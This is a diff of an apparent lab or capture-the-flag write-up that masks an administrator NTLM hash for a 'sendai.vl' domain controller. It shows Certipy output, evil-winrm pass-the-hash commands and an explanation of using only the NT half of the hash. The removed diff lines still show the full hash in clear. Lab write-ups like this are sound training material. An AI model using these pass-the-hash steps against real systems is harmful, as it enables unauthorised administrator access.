@@ -1390,7 +1390,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'administrator.ccache'  
 [*] Wrote credential cache to 'administrator.ccache'  
 [*] Trying to retrieve NT hash for 'administrator'  
-[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
+[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106f******************be8d087a
 ```
 
 And we got the hash !
@@ -1417,7 +1417,7 @@ For some reason, the hash format is 'invalid'.
 I try again : 
 
 ```PowerShell
->  evil-winrm -i 10.129.234.66 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a'  
+>  evil-winrm -i 10.129.234.66 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106*************d087a'  
   
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
@@ -1427,7 +1427,7 @@ You can add reline to your Gemfile or gemspec to silence this warning.
 Evil-WinRM shell v3.9  
                                           
 Error: Invalid hash format  
->  evil-winrm -i dc.sendai.vl -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a'  
+>  evil-winrm -i dc.sendai.vl -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:cfb106f*******************87a'  
   
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
@@ -1442,7 +1442,7 @@ Error: Invalid hash format
 I got it now. We got an NTLM hash (confirmed by nxc to be the right one) but to connect to the shell, we only need the NT part : the hash is divided in two parts : `aad3b435b51404eeaad3b435b51404ee` and `cfb106feec8b89a3d98e14dcbe8d087a`, separated by a : which means the NTLM hash can be divided into the NT (the latter part) and LM (the former part) `LM:NT`. The first part of this NTLM hash is a dummy value because LM is disabled. Usually, the NT hash is the one we would be looking for to authenticate via Pass-The-Hash :
 
 ```PowerShell
->  evil-winrm -i dc.sendai.vl -u administrator -H 'cfb106feec8b89a3d98e14dcbe8d087a'  
+>  evil-winrm -i dc.sendai.vl -u administrator -H 'cfb10****************be8d087a'  
   
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
 /usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
